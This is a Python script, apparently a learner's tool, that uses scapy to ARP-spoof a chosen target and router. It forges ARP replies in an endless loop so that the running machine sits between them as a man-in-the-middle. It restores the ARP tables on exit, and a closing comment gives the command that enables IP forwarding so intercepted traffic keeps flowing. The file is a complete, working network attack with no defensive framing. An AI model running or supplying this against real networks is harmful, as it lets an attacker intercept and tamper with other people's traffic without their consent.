import scapy.all as scapy
import time
import subprocess
import optparse


# get arguments of target and router
def get_arguments():
    parser = optparse.OptionParser()
    parser.add_option("-t", "--target", dest="target",
                      help="Target Ip")
    parser.add_option("-r", "--router", dest="router",
                      help="Router Ip")
    (options, arguments) = parser.parse_args()
    return options.target, options.router


# use scan to comunicate with ip and get mac address
def scan(ip):
    # ARP REQUEST -> who has net ip?
    arp_request = scapy.ARP(pdst=ip)
    # internet object frame
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    # ARP REQUEST + INTERNET FRAME
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast,
                              timeout=1, verbose=False)[0]

    # list of dictionaries
    clients_list = []
    for element in answered_list:
        client_dict = {"ip": element[1].psrc, "mac": element[1].hwsrc}
        clients_list.append(client_dict)
        return clients_list


# function spoof to comunicate ips change targets
def spoof(target_ip, spoof_ip):
    target_list = scan(target_ip)[0]
    packet = scapy.ARP(op=2, pdst=target_list['ip'], hwdst=target_list['mac'],
                       psrc=spoof_ip)
    scapy.send(packet, verbose=False)
    print(packet.show())
    print(packet.summary())


# function to changes ip targets and routers
def spoof_func(target_ip, spoof_ip):
    spoof(spoof_ip, target_ip)  # tell router "im target"
    spoof(target_ip, spoof_ip)  # tell target "im router"


# function restore the ips
def restore(destination_ip, source_ip):
    destination_list = scan(destination_ip)[0]
    source_list = scan(source_ip)[0]
    packet = scapy.ARP(op=2, pdst=destination_list['ip'],
                       hwdst=destination_list['mac'],
                       psrc=source_list['ip'],
                       hwsrc=source_list['mac'])
    scapy.send(packet, count=4, verbose=False)
    print(packet.show())
    print(packet.summary())


# get arguments
target, router = get_arguments()
try:
    while True:
        # call clear
        subprocess.call('clear')
        try:
            # use spoof function
            spoof_func(target, router)
            print("[+] Sent to packets")
            time.sleep(2)
        except Exception as e:
            print(e)
except KeyboardInterrupt:
    subprocess.call('clear')
    print("[-] Detected CTRL + C ... Resetting ARP tables")
    restore(target, router)
    restore(router, target)

# %sh echo 1 > /proc/sys/net/ipv4/ip_forward
